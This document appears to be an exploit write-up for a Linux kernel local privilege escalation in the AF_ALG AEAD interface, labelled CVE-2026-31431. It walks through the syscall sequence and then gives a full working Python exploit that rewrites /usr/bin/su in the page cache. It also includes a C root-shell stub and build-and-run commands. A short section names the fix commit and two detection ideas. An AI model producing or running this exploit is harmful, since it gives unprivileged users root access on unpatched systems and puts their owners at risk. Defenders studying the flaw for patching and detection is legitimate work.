# Copy Fail - CVE-2026-31431 (AF_ALG / algif_aead)

Unprivileged local user gets a controlled **4-byte write into the page cache of any readable file**, repeatedly and without a race. Kernel 4.17+ with `algif_aead` (module or built-in). Fix reverts AF_ALG AEAD to an out-of-place operation (`a664bf3d603d`).

The primitive: `AF_ALG` (socket family 38) with the `aead` / `authencesn(hmac(sha256),cbc(aes))` template; a zero-length `splice()` from the target file into the socket is treated as disposable scratch, so the in-place decrypt writes into the file's page-cache page instead of a kernel buffer.

## Call sequence

1. `socket(38, SOCK_SEQPACKET, 0)`, then `bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))`.
2. `setsockopt(SOL_ALG=279, ALG_SET_KEY=1, <0x28-byte key>)` and `setsockopt(279, ALG_SET_AEAD_AUTHSIZE=5, NULL, 4)`.
3. `accept()` gives the operating socket.
4. `sendmsg([b"A"*4 + <4 target bytes>], [(279, ALG_SET_OP=3, 4 bytes), (279, ALG_SET_IV=2, 20 bytes), (279, ALG_SET_AEAD_ASSOCLEN=4, 4 bytes)])`. The control-message values are what place the write at the wanted offset.
5. `splice(target_fd -> pipe -> socket, offset+4 bytes)`: the file pages become the AEAD input.
6. `recv()` drives the decrypt; the four bytes end up in the cached page at the target offset. Repeat at `offset += 4` over the whole payload.

## Readable implementation (reconstruction, same call sequence)

The upstream 732-byte PoC is deliberately golfed and ships the payload as a zlib blob; this version keeps the same syscall sequence with names and comments. Compile the stub below and feed its first pages instead of the blob.

```python
import os, socket, sys

AF_ALG, SOL_ALG = 38, 279
ALG_SET_KEY, ALG_SET_IV, ALG_SET_OP = 1, 2, 3
ALG_SET_AEAD_ASSOCLEN, ALG_SET_AEAD_AUTHSIZE = 4, 5

def write4(path_fd, offset, four_bytes):
    s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    s.setsockopt(SOL_ALG, ALG_SET_KEY, bytes.fromhex("0800010000000010") + b"\x00" * 64)
    s.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    op, _ = s.accept()

    z = b"\x00"
    op.sendmsg([b"A" * 4 + four_bytes],
               [(SOL_ALG, ALG_SET_OP, z * 4),
                (SOL_ALG, ALG_SET_IV, b"\x10" + z * 19),
                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + z * 3)], 32768)

    r, w = os.pipe()
    n = offset + 4
    os.splice(path_fd, w, n, offset_src=0)      # file page -> pipe -> socket
    os.splice(r, op.fileno(), n)
    try:
        op.recv(8 + offset)
    except OSError:
        pass

fd = os.open("/usr/bin/su", os.O_RDONLY)
payload = open("stub.elf", "rb").read()
for off in range(0, len(payload), 4):
    write4(fd, off, payload[off:off + 4])
os.system("su")
```

Payload stub (replace the blob; build statically and keep it small):

```c
#include <unistd.h>
int main(void) { setresuid(0,0,0); setresgid(0,0,0); execl("/bin/sh","sh",0); return 0; }
```

## Use / cleanup

```bash
gcc -O2 -static -o stub.elf stub.c
python3 copy_fail.py            # patches /usr/bin/su in cache, then execs su
# afterwards, or the next su run gives another shell:
echo 1 > /proc/sys/vm/drop_caches   # root; or reboot
```

Detection in the field: seccomp denying `socket(AF_ALG, ...)`; runtime hashing of resident pages. Disk and registry scans see the original binary.

Upstream: <https://github.com/theori-io/copy-fail-CVE-2026-31431> (the original 732-byte PoC), disclosure <https://copy.fail/>, CERT/CC VU#260001.
